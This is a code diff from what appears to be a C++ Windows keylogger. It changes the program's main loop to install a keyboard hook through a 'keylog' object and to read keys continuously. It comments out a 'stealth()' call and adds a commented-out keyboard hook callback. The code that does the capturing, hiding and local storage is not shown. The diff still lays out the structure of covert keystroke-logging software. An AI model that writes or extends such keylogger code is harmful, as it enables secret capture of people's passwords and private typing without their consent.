@@ -12,8 +12,7 @@
 
 Core::Core()
 {
-	hIn = GetStdHandle(STD_INPUT_HANDLE);
-	hOut = GetStdHandle(STD_OUTPUT_HANDLE);
+
 }
 
 Core::~Core()
@@ -37,27 +36,45 @@ int	Core::storeLocally(const std::string &msg)
 
 int	Core::run()
 {
-	bool Continue = TRUE;
+	bool Continue = true;
 
-	keylog.stealth();
+	if (keylog.installhook() == false)
+		Continue = false;
+	//keylog.stealth();
+
+
 	while (Continue)
 	{
-		ReadConsoleInput(hIn,
-			&InRec,
-			1,
-			&NumRead);
-
-		switch (InRec.EventType)
-		{
-		case KEY_EVENT:
-			if (keylog.getKey(InRec) == 1)
-				Continue = FALSE;
-			break;
-
-		case MOUSE_EVENT:
-			keylog.getMouse();
-			break;
-		}
+		keylog.getKey();
 	}
 	return (0);
 }
+
+/* LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)
+{
+	CHAR szBuf[128];
+	HDC hdc;
+	static int c = 0;
+	size_t cch;
+	HRESULT hResult;
+
+	if (nCode < 0)  // do not process message 
+		return CallNextHookEx(myhookdata[IDM_KEYBOARD].hhook, nCode,
+			wParam, lParam);
+
+	hdc = GetDC(gh_hwndMain);
+	hResult = StringCchPrintf(szBuf, 128 / sizeof(TCHAR), "KEYBOARD - nCode: %d, vk: %d, %d times ", nCode, wParam, c++);
+	if (FAILED(hResult))
+	{
+		// TODO: write error handler
+	}
+	hResult = StringCchLength(szBuf, 128 / sizeof(TCHAR), &cch);
+	if (FAILED(hResult))
+	{
+		// TODO: write error handler
+	}
+	TextOut(hdc, 2, 115, szBuf, cch);
+	ReleaseDC(gh_hwndMain, hdc);
+
+	return CallNextHookEx(myhookdata[IDM_KEYBOARD].hhook, nCode, wParam, lParam);
+} */
